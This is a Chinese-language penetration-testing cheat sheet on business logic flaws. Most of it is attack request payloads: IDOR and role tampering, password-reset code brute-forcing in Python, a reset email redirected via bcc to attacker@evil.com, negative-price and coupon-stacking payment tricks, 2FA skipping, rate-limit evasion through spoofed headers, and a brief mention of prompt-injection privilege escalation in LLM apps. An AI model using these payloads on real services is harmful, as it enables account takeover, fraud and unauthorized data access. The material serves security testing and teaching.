# 逻辑漏洞

## 原理

应用程序业务逻辑设计缺陷，导致攻击者可以绕过认证、越权访问、篡改数据、薅羊毛等。逻辑漏洞不依赖技术漏洞，而是业务设计问题。

## 攻击链

### 1. 越权访问

#### 水平越权

```http
# 修改用户 ID
GET /api/user/1001    # 自己的
GET /api/user/1002    # 别人的

# 修改用户名
GET /api/profile?username=admin

# 修改 UUID
GET /api/order/uuid-1234
GET /api/order/uuid-1235
```

#### 垂直越权

```http
# 普通用户访问管理员功能
GET /admin/users
POST /admin/user/delete

# 修改角色
POST /api/profile
{"role": "admin"}

# 修改 Cookie
Cookie: role=user
Cookie: role=admin
```

#### 越权数据访问

```http
# 通过 IDOR
GET /api/invoice/1001
GET /api/invoice/1002  # 别人的发票

# 通过 GUID
GET /api/document/550e8400-e29b-41d4-a716-446655440000

# 通过遍历
GET /api/user/1
GET /api/user/2
# ...
```

### 2. 密码找回漏洞

#### 验证码爆破

```python
# 4 位验证码
for i in range(10000):
    code = f"{i:04d}"
    r = requests.post("/api/reset/verify", data={"code": code})
    if "success" in r.text:
        print(code)
        break
```

#### Token 可预测

```python
# 基于 timestamp 的 token
import time
timestamp = int(time.time())
token = hashlib.md5(str(timestamp).encode()).hexdigest()
```

#### Token 不过期

```python
# 重置 token 长期有效
# 可重复使用
```

#### 验证码回显

```http
# 响应中包含验证码
POST /api/reset/send
{"email": "victim@target.com"}

# 响应
{"code": "123456"}
```

#### 邮箱注入

```http
# 修改收件人
POST /api/reset/send
{"email": "victim@target.com", "bcc": "attacker@evil.com"}
```

### 3. 支付逻辑漏洞

#### 金额篡改

```http
# 修改金额
POST /api/order
{"item": "phone", "price": 0.01, "quantity": 1}

# 修改数量
POST /api/order
{"item": "phone", "price": 999, "quantity": -1}
# 总价 = 999 * (-1) = -999
```

#### 并发支付

```python
# 同一订单多次支付
# 利用竞态条件
```

#### 优惠券叠加

```http
# 多个优惠券叠加
POST /api/order
{"coupons": ["DISCOUNT10", "DISCOUNT20", "DISCOUNT30"]}
```

#### 积分兑换

```http
# 修改积分
POST /api/points/exchange
{"points": -1000}  # 负数
```

### 4. 验证码漏洞

#### 验证码不过期

```python
# 验证码长期有效
# 可重复使用
```

#### 验证码回显

```http
# 响应中包含验证码
POST /api/login
{"username": "admin", "password": "wrong"}

# 响应
{"captcha": "ABCD", "error": "wrong password"}
```

#### 验证码爆破

```python
# 4 位验证码
# 没有限流
for i in range(10000):
    code = f"{i:04d}"
    # ...
```

#### 万能验证码

```http
# 空验证码
POST /api/login
{"username": "admin", "password": "admin", "captcha": ""}

# 0000
POST /api/login
{"username": "admin", "password": "admin", "captcha": "0000"}
```

### 5. 注册逻辑漏洞

#### 覆盖注册

```http
# 注册已存在的用户名
POST /api/register
{"username": "admin", "password": "attacker_password"}
# 如果服务器先删除再创建，可覆盖管理员
```

#### 重复注册

```http
# 利用竞态条件
# 同时发送多个注册请求
```

#### 邮箱绕过

```http
# 大小写绕过
admin@target.com
Admin@target.com
ADMIN@target.com

# 空格绕过
admin@target.com 
 admin@target.com

# 点绕过
a.d.m.i.n@target.com

# + 绕过
admin+1@target.com
admin+2@target.com
```

### 6. 2FA 绕过

#### 跳过验证

```http
# 直接访问下一步
POST /api/login
{"username": "admin", "password": "pass"}

# 响应
{"step": "2fa", "session": "abc"}

# 直接访问受保护资源
GET /api/profile
Cookie: session=abc
```

#### 验证码爆破

```python
# 6 位验证码
# 没有限流
for i in range(1000000):
    code = f"{i:06d}"
    # ...
```

#### 重放攻击

```python
# 使用过的验证码仍可用
```

#### 会话固定

```http
# 登录前后 session 不变
# 攻击者预设 session，受害者登录后劫持
```

### 7. 业务流程绕过

#### 步骤跳过

```http
# 正常流程
1. /api/cart/add
2. /api/checkout
3. /api/payment
4. /api/success

# 跳过支付
POST /api/success
```

#### 顺序颠倒

```http
# 先确认再支付
POST /api/confirm
POST /api/payment
```

### 8. 接口限流绕过

```http
# 修改 IP
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4

# 修改 User-Agent
User-Agent: bot1
User-Agent: bot2

# 修改路径
/api/login
/api/login/
/api/login?
/api/login?
/api/./login
```

## 绕过技巧

### 1. 参数污染

```http
# 同名参数
GET /api/user?id=1&id=2
# 不同服务器处理不同

# JSON
{"id": 1, "id": 2}
```

### 2. 数组绕过

```http
# 数组参数
POST /api/login
username[]=admin&password[]=pass

# JSON 数组
{"username": ["admin"], "password": ["pass"]}
```

### 3. 类型混淆

```http
# 字符串 vs 数字
{"id": "1"}  # 字符串
{"id": 1}    # 数字
{"id": true} # 布尔

# 弱类型比较
{"id": 0}    # 可能匹配所有
{"id": true} # 可能匹配所有
```

### 4. 编码绕过

```http
# URL 编码
%61%64%6d%69%6e = admin

# 双重编码
%2561%2564%256d%2569%256e

# Unicode 编码
\u0061\u0064\u006d\u0069\u006e
```

### 5. 大小写绕过

```http
Admin
ADMIN
aDmIn
```

### 6. 空格绕过

```http
admin 
 admin
admin%20
admin%00
```

## 2024-2026 新技术点

### 1. API 越权新场景

```http
# REST API
# GraphQL
# gRPC
# WebSocket
# 各 API 类型的越权
```

### 2. 微服务越权

```http
# 服务间调用越权
# 通过 service mesh 绕过
# 通过 sidecar 绕过
```

### 3. Serverless 越权

```http
# AWS Lambda
# Azure Functions
# Google Cloud Functions
# 各 Serverless 平台的越权
```

### 4. OAuth 越权

```http
# scope 提权
# redirect_uri 绕过
# PKCE 缺失
# state 缺失
```

### 5. JWT 越权

```http
# 通过 JWT payload 修改角色
# 通过 JWT 算法混淆
# 通过 JWT 密钥爆破
```

### 6. AI 应用越权

```http
# LLM 应用中的越权
# 通过 prompt injection 提权
# 通过工具调用越权
```

### 7. 多租户越权

```http
# SaaS 应用
# 修改 tenant_id
# 修改 organization_id
```

### 8. 容器越权

```http
# Kubernetes RBAC
# Service Account
# 各容器环境的越权
```

### 9. 移动应用越权

```http
# App API 越权
# 通过逆向 App 发现 API
# 通过 Frida hook 绕过
```

### 10. 物联网越权

```http
# IoT 设备 API
# 通过 MQTT 越权
# 通过 CoAP 越权
```

## 工具推荐

- **Burp Suite** — 手动测试
- **Autorize** (Burp 插件) — 越权检测
- **Authz** (Burp 插件) — 越权检测
- **AuthMatrix** (Burp 插件) — 权限矩阵测试
- **API Testing** — API 安全测试

## 参考链接

- [PortSwigger Business Logic](https://portswigger.net/web-security/logic-flaws)
- [OWASP Access Control](https://owasp.org/www-community/Access_Control)
- [PayloadsAllTheThings - IDOR](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/IDOR%20Error%20Messages)
